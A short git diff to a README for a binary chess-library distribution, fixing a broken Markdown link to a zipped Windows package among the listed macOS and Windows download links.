@@ -15,7 +15,7 @@ This repository contains instructions for installing and running a binary distri
  - [Mac OS 15](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/macos/chesslib-macos-15.tar.gz.zip)
 
 ## Windows
- - [Windows 2022]((https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/windows/chesslib.exe.zip)
+ - [Windows 2022](https://github.com/julien-tierny/chess-referee-bin/raw/refs/heads/main/packages/windows/chesslib.exe.zip)
 
 # Installation
 
